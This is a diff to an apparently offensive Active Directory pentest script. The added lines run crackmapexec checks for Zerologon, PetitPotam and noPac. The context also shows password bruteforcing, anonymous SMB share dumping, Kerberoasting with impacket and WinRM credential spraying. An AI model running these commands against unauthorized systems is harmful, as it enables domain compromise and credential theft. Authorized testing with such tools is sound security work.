@@ -13,7 +13,7 @@ path_impacket="/opt/impacket/examples"
 
 red = "\033[0;31m"
 green = "\033[0;32m"
-yellow = "\033[0;33m"
+yellow = "\033[1;93m"
 blue = "\033[0;34m"
 white = "\033[0;37m"
 
@@ -327,7 +327,7 @@ if smb==1:
 			print()
 		else:
 			os.system("rm smb_vuln.txt")
-
+		
 		# scan anonymous shares
 		if not nsd:
 			os.system('if [ ! -d "smb_dump" ];then mkdir smb_dump; fi')
@@ -505,7 +505,8 @@ if len(contenu) !=0:
 	printf(" Bruteforcing passwords",green)
 	for i,user in enumerate(contenu):
 		print(i+1,user.replace("\n",""))
-	a=input(blue+f"Which user to bruteforce? 0=None: "+white)
+	
+	a=input(blue+"Which user to bruteforce? 0=None: "+white)	
 	if a!="0":
 		user=contenu[int(a)-1].replace("\n","")
 		print("")
@@ -545,7 +546,11 @@ if os.path.isfile(f'all_creds.txt'):
 if ldap:
 	if len(contenu) !=0:
 		dumpLdapDB(contenu, ip_to_scan, Domain_Name)
-
+if smb:
+	printf(" scanning Zerologon vuln",green)
+	os.system(f"crackmapexec smb {ip_to_scan} -u 'guest' -p '' -M zerologon")
+	printf(" scanning Petitpotam vuln",green)
+	os.system(f"crackmapexec smb {ip_to_scan} -u '' -p '' -M petitpotam")
 
 if len(contenu) !=0:
 	print()
@@ -614,11 +619,15 @@ if len(contenu) !=0:
 			os.system(f'crackmapexec --timeout 2 winrm {ip_to_scan} -u {user} -p {passw} --fail-limit 2 -d {Domain_Name}')
 		print()
 
+
 if len(contenu) !=0:
 	user=contenu[0].split(":")[0]
 	passw=contenu[0].split(":")[1].replace("\n","")
 	printf(" scanning Kerberoastable accounts:",green)
 	os.system(f"python {path_impacket}/GetUserSPNs.py -dc-ip {ip_to_scan} {Domain_Name}/{user}:{passw} | grep -v Impacket")
+
+	printf(" scanning for noPac",green)
+	os.system(f"crackmapexec smb {ip_to_scan} -u {user} -p '{passw}' -M nopac")
 
 if os.path.isdir("./smb_dump"):
 	os.chdir("./smb_dump")
